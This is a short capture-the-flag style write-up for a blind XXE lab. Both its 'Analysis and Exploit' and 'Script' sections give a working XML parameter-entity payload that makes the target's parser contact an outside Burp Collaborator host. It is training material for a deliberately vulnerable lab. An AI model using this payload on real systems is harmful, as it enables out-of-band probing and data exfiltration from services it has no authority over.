### Lab: Blind XXE with out-of-band interaction via XML parameter entities

This lab has a "Check stock" feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.

To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

_____

Analysis and Exploit:

1. Intercept the request via **[BURP-PROXY]** in **/product/stock**
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <stockCheck><productId>1</productId>
    <storeId>1</storeId></stockCheck>
    ```
2. Create the payload and send it via **[BURP-REPEATER]**
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE jito [ <!ENTITY % xxe SYSTEM "http://xxe.burpcollaborator.net"> %xxe; ]>
    <stockCheck><productId>1</productId>
    <storeId>1</storeId></stockCheck>
    ```

_____

Script:

1. Send payload | POST **/product/stock** | params: 'xml payload'
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE jito [ <!ENTITY % xxe SYSTEM "http://xxe.burpcollaborator.net"> %xxe; ]>
    <stockCheck><productId>1</productId>
    <storeId>1</storeId></stockCheck>
    ```
    - if "XML parsing error" not in response and status code != 400: error/stops